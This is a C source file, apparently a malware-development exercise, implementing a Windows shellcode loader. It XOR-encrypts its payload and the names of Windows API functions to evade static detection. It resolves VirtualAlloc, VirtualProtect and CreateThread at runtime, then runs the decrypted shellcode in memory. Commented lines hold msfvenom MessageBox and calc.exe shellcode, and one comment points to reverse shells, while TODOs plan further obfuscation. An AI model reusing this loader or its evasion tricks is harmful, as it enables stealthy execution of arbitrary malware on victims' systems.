/*
	Author ReverseThrottle
	Inspired by RTO Mal Dev
	0xDescent
	05/27/22
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Shellcode MessageBox
// 0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0xc, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x8, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x1, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x1, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x1, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x1, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x7, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x1, 0xeb, 0x66, 0x8b, 0xc, 0x4b, 0x8b, 0x5a, 0x1c, 0x1, 0xeb, 0x8b, 0x4, 0x8b, 0x1, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2, 0x8, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0xe, 0xec, 0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x4, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x8, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0xa, 0x89, 0xe6, 0x56, 0xff, 0x55, 0x4, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x6f, 0x78, 0x58, 0x20, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0xa, 0x89, 0xe3, 0x68, 0x70, 0x65, 0x72, 0x58, 0x68, 0x44, 0x72, 0x6f, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x5f, 0x68, 0x44, 0x65, 0x73, 0x63, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0xf, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff, 0x55, 0x8 
//XOR encoded MsgBox x86 payload MSFVENOM
// 0xb4, 0x92, 0xe8, 0xbc, 0x17, 0x56, 0x91, 0x45, 0xb9, 0xd7, 0x12, 0x54, 0xa4, 0x1d, 0xf8, 0x14, 0x53, 0xf9, 0x13, 0x78, 0xe0, 0x13, 0x79, 0xee, 0x2b, 0x71, 0xf8, 0x1b, 0x43, 0xf9, 0x53, 0x4c, 0x24, 0x7d, 0x10, 0x96, 0x34, 0x78, 0xa2, 0x9a, 0x82, 0x12, 0xee, 0x18, 0x4f, 0x41, 0xee, 0x20, 0x51, 0xf2, 0x27, 0x4d, 0x1b, 0x73, 0x8f, 0xff, 0x21, 0x7d, 0xee, 0x3f, 0x4d, 0x78, 0x98, 0x86, 0x57, 0x3b, 0xee, 0x40, 0xe0, 0x64, 0x8b, 0x54, 0x92, 0x48, 0xb3, 0x99, 0xcf, 0xf6, 0xa5, 0x0, 0x6c, 0xa4, 0xaa, 0x68, 0x6c, 0xbe, 0x98, 0x91, 0x58, 0xe, 0x41, 0x5c, 0x1e, 0x84, 0xee, 0x3f, 0x49, 0x78, 0x98, 0x3, 0xe8, 0x7e, 0x2e, 0xff, 0x31, 0x79, 0x64, 0x8e, 0xe6, 0x7d, 0xf8, 0x64, 0x8b, 0xfb, 0x21, 0x50, 0x77, 0x4, 0xa6, 0xd7, 0x65, 0x50, 0xa7, 0xec, 0x86, 0xfb, 0xa7, 0x1c, 0xe5, 0x2b, 0x6b, 0x89, 0x3f, 0x91, 0xec, 0x9a, 0x9c, 0x8d, 0xec, 0x31, 0x6f, 0xde, 0x1b, 0xbd, 0x8f, 0xa, 0xf4, 0x79, 0x47, 0x20, 0x8d, 0xfa, 0x94, 0x9a, 0x9a, 0xec, 0x28, 0x71, 0x1b, 0x9, 0xf, 0x52, 0x24, 0x1c, 0x58, 0x57, 0x4b, 0x1, 0x5, 0xc, 0x0, 0x0, 0x11, 0x42, 0xbe, 0xfc, 0x37, 0x41, 0x6f, 0xec, 0x8b, 0x2f, 0x8c, 0x30, 0x67, 0xfb, 0xa7, 0x24, 0xd0, 0xcd, 0xc7, 0x28, 0xd1, 0xfe, 0x6f, 0x41, 0x31, 0x9a, 0x3a, 0x8b, 0x94, 0x9a, 0xd, 0x0, 0x3, 0xd, 0x2b, 0xd, 0x27, 0x17, 0x16, 0x17, 0x5a, 0xbe, 0xed, 0x39, 0x49, 0x7e, 0xfa, 0x86, 0xb, 0x3d, 0xd, 0x2c, 0x4b, 0x54, 0xac, 0xed, 0x21, 0x5d, 0x71, 0xec, 0x82, 0x43, 0xb7, 0x26, 0x38, 0x34, 0x37, 0x9a, 0xbd, 0x48, 0xb3, 0x35, 0x9c, 0x27, 0x6d
//XOR encoded MsgBox x64 payload MSFVENOM
// 0x91, 0x31, 0xf2, 0x81, 0x93, 0x8d, 0x9a, 0x8b, 0x83, 0xb5, 0x65, 0x65, 0x6d, 0x38, 0x22, 0x24, 0x33, 0x20, 0x34, 0x22, 0x23, 0x54, 0xb7, 0x0, 0x25, 0xf2, 0x21, 0x5, 0x5d, 0x3a, 0xee, 0x26, 0x73, 0x5b, 0x2d, 0xee, 0x3f, 0x59, 0x4d, 0x2d, 0xe8, 0x0, 0x35, 0x4a, 0x23, 0x6a, 0xd2, 0x2f, 0x27, 0x34, 0x42, 0xac, 0x2b, 0x43, 0xa5, 0xd8, 0x57, 0x4, 0x19, 0x67, 0x41, 0x59, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x87, 0x88, 0x37, 0x2c, 0x28, 0x4d, 0x2d, 0xe8, 0x20, 0x45, 0x4a, 0xe0, 0x27, 0x59, 0x2d, 0x6c, 0xa9, 0x4d, 0xee, 0xe3, 0xfa, 0x65, 0x74, 0x6b, 0x2d, 0xe0, 0xa5, 0x19, 0x16, 0x3b, 0x64, 0xb3, 0x22, 0x5b, 0xff, 0x23, 0x7d, 0x5b, 0x21, 0xe6, 0x39, 0x53, 0x2c, 0x62, 0xa2, 0x86, 0x28, 0x23, 0x9a, 0xac, 0x5b, 0x2c, 0xf2, 0x47, 0xed, 0x2b, 0x73, 0xb3, 0x39, 0x5a, 0xac, 0x2d, 0x54, 0xad, 0xd5, 0x32, 0xa4, 0xaa, 0x7f, 0x24, 0x75, 0xaa, 0x5d, 0x85, 0x10, 0x9c, 0x47, 0x3f, 0x66, 0x2f, 0x56, 0x6d, 0x31, 0x52, 0xb4, 0x10, 0xb3, 0x35, 0x47, 0x37, 0xee, 0x23, 0x56, 0x2c, 0x75, 0xbb, 0x3, 0x5b, 0x24, 0xe6, 0x75, 0x3b, 0x5b, 0x27, 0xf9, 0x25, 0x68, 0x22, 0x64, 0xb5, 0x5b, 0x2c, 0xf2, 0x77, 0xed, 0x2b, 0x73, 0xb5, 0x35, 0x33, 0x24, 0x3d, 0x3b, 0x34, 0x23, 0x32, 0x3d, 0x22, 0x2b, 0x24, 0x2e, 0x23, 0xe6, 0x89, 0x45, 0x2c, 0x2b, 0x8c, 0x85, 0x3b, 0x33, 0x3c, 0x2e, 0x55, 0x2d, 0xee, 0x77, 0x84, 0x30, 0x8c, 0x9a, 0x9c, 0x2f, 0x2c, 0xb3, 0xaa, 0x65, 0x65, 0x65, 0x6d, 0x47, 0x3b, 0xe8, 0xf6, 0x8c, 0x65, 0x74, 0x6b, 0x5b, 0x29, 0xe8, 0xe8, 0x78, 0x72, 0x65, 0x63, 0x3a, 0x54, 0xbd, 0x2a, 0xdf, 0x20, 0xe6, 0x3b, 0x7e, 0x8c, 0xb0, 0x2b, 0x43, 0xac, 0x35, 0xd1, 0x95, 0xd0, 0xc7, 0x3b, 0x86, 0xa6, 0x2a, 0xb, 0x72, 0x21, 0x11, 0x18, 0x6, 0x0, 0xb, 0x19, 0x79
//Cal.exe payload (ehh not 100%)
// 0xfc, 0xe8, 0x82, 0x0, 0x0, 0x0, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 0x8b, 0x52, 0xc, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0xf, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x2, 0x2c, 0x20, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x1, 0xd1, 0x51, 0x8b, 0x59, 0x20, 0x1, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 0x1, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0xd, 0x1, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x3, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x1, 0xd3, 0x66, 0x8b, 0xc, 0x4b, 0x8b, 0x58, 0x1c, 0x1, 0xd3, 0x8b, 0x4, 0x8b, 0x1, 0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x6a, 0x1, 0x8d, 0x85, 0xb2, 0x0, 0x0, 0x0, 0x50, 0x68, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x3c, 0x6, 0x7c, 0xa, 0x80, 0xfb, 0xe0, 0x75, 0x5, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x0, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x0 
// Generate various shellcodes / Reverse Shells / ETC

//Payload XOR encrypted along with function strings
unsigned char payload[] = { 0x91, 0x8d, 0xed, 0x77, 0x6d, 0x65, 0xf, 0xfe, 0x88, 0x54, 0xaf, 0x13, 0xe6, 0x35, 0x5f, 0xfc, 0x3f, 0x69, 0xe4, 0x25, 0x79, 0xee, 0x1d, 0x5f, 0x62, 0xd2, 0x25, 0x51, 0x5c, 0x9a, 0xc3, 0x4b, 0xc, 0x19, 0x6d, 0x5b, 0x4d, 0xa4, 0xa0, 0x7a, 0x6c, 0xa2, 0x8d, 0x85, 0x3f, 0x32, 0xe4, 0x25, 0x7d, 0xee, 0x25, 0x4b, 0xe6, 0x29, 0x7e, 0xf, 0x8e, 0x2d, 0x6e, 0xa6, 0x3c, 0xee, 0x36, 0x57, 0x6c, 0xb6, 0xe4, 0x3e, 0x75, 0x86, 0x55, 0x3e, 0xe6, 0x51, 0xe4, 0x76, 0xbb, 0x54, 0x90, 0xdb, 0xac, 0xaa, 0x62, 0x76, 0xaa, 0x5d, 0x8f, 0x2, 0x9b, 0x66, 0x12, 0x8f, 0x56, 0x18, 0x4b, 0x2, 0x89, 0x3d, 0xe4, 0x2f, 0x49, 0x64, 0xbc, 0x11, 0xe6, 0x69, 0x24, 0xfc, 0x35, 0x79, 0x6e, 0xa4, 0xe6, 0x61, 0xe4, 0x76, 0xbd, 0xec, 0x2b, 0x53, 0x49, 0x3e, 0x34, 0x16, 0x34, 0x3f, 0x3e, 0x88, 0x8d, 0x3a, 0x30, 0x2d, 0xe6, 0x77, 0x84, 0xfa, 0x30, 0xf, 0x6e, 0xfa, 0xe8, 0xd7, 0x6f, 0x77, 0x6d, 0x35, 0x7, 0x46, 0xe6, 0xa, 0xe8, 0x88, 0xb8, 0xde, 0x9f, 0xc2, 0xcf, 0x33, 0x7, 0xd1, 0xf8, 0xd8, 0xf2, 0x88, 0xb8, 0x59, 0x69, 0xb, 0x67, 0xe5, 0x94, 0x97, 0x18, 0x60, 0xd4, 0x30, 0x7e, 0x17, 0x0, 0x1d, 0x6d, 0x36, 0x90, 0xa2, 0xe, 0x4, 0x3, 0x14, 0x43, 0x0, 0x17, 0x12, 0x6d };
unsigned int payload_len = sizeof(payload);
unsigned char cKernel32[] = { 0x6, 0x0, 0x1d, 0x19, 0x8, 0x9, 0x5c, 0x45, 0x43, 0x1, 0x3, 0x1b, 0x6d };
unsigned int cKernel32Len = sizeof(cKernel32);
unsigned char cVirtualAlloc[] = { 0x3b, 0xc, 0x1d, 0x3, 0x18, 0x4, 0x3, 0x36, 0x1, 0x9, 0x0, 0x14, 0x6d };
unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);
unsigned char cVirtualProtect[] = { 0x3b, 0xc, 0x1d, 0x3, 0x18, 0x4, 0x3, 0x27, 0x1f, 0xa, 0x1b, 0x12, 0xe, 0x11, 0x6f };
unsigned int cVirtualProtectLen = sizeof(cVirtualProtect);
unsigned char cCreateThread[] = { 0x2e, 0x17, 0xa, 0x16, 0x19, 0x0, 0x3b, 0x1f, 0x1f, 0x0, 0xe, 0x13, 0x6d };
unsigned int cCreateThreadLen = sizeof(cCreateThread);
unsigned char cWaitForSingleObject[] = { 0x3a, 0x4, 0x6, 0x3, 0x2b, 0xa, 0x1d, 0x24, 0x4, 0xb, 0x8, 0x1b, 0x8, 0x2a, 0xd, 0x1d, 0x8, 0x6, 0x1b, 0x77 };
unsigned int cWaitForSingleObjectLen = sizeof(cWaitForSingleObject);
unsigned char cGetProcAddress[] = { 0x2a, 0x0, 0x1b, 0x27, 0x1f, 0xa, 0xc, 0x36, 0x9, 0x1, 0x1d, 0x12, 0x1e, 0x16, 0x6f };
unsigned int cGetProcAddressLen = sizeof(cGetProcAddress);
unsigned char cGetModuleHandle[] = { 0x2a, 0x0, 0x1b, 0x3a, 0x2, 0x1, 0x1a, 0x1b, 0x8, 0x2d, 0xe, 0x19, 0x9, 0x9, 0xa, 0x77 };
unsigned int cGetModuleHandleLen = sizeof(cGetModuleHandle);

//XOR Key
char secKey[] = "meowmeow";

//Used to call WINAPI via pointer
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD  dwMilliseconds);
FARPROC (WINAPI * pGetProcAddress)(HMODULE hModule, LPCSTR  lpProcName);
HMODULE (WINAPI * pGetModuleHandle)(LPCSTR lpModuleName);

//XOR algorithm 
void XOR(char * data, size_t data_len, char * key, size_t key_len){
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
			if (j == key_len - 1) j = 0;
			data[i] = data[i] ^ key[j];
			j++;
	}
}


// *TODO Obfuscate function calls to GetProcAddress & GetModuleHandle (FIX!!)
// *TODO Working on rolling XOR (hiding XOR key more)

int main(void){

	void * lpAddress;
	HANDLE h;
	BOOL fProtect;
	DWORD lpOldProtect = 0;

	//Decrypt function strings
	XOR((char *) cVirtualAlloc, cVirtualAllocLen, secKey, sizeof(secKey));
	XOR((char *) cKernel32, cKernel32Len, secKey, sizeof(secKey));
	XOR((char *) cGetProcAddress, cGetProcAddressLen, secKey, sizeof(secKey));
	XOR((char *) cGetModuleHandle, cGetModuleHandleLen, secKey, sizeof(secKey));
	
	
	
	pVirtualAlloc = pGetProcAddress(pGetModuleHandle(cKernel32), cVirtualAlloc);
	//Allocate memory
	lpAddress = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	
	XOR((char *) payload, payload_len, secKey, sizeof(secKey));

	//Test other Move memory api calls 
	RtlMoveMemory(lpAddress, (void *)payload, payload_len);

	XOR((char *) cVirtualProtect, cVirtualProtectLen, secKey, sizeof(secKey));
	
	pVirtualProtect = pGetProcAddress(pGetModuleHandle(cKernel32), cVirtualProtect);

	fProtect = pVirtualProtect(lpAddress, payload_len, PAGE_EXECUTE_READ, &lpOldProtect);

	// getchar();
	XOR((char *) cCreateThread, cCreateThreadLen, secKey, sizeof(secKey));
	XOR((char *) cWaitForSingleObject, cWaitForSingleObjectLen, secKey, sizeof(secKey));

	pCreateThread = pGetProcAddress(pGetModuleHandle(cKernel32), cCreateThread);
	pWaitForSingleObject = pGetProcAddress(pGetModuleHandle(cKernel32), cWaitForSingleObject);

	if (fProtect != 0){
			h = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) lpAddress, 0, 0, 0);
			pWaitForSingleObject(h, 1);

	}

	return 0;
}
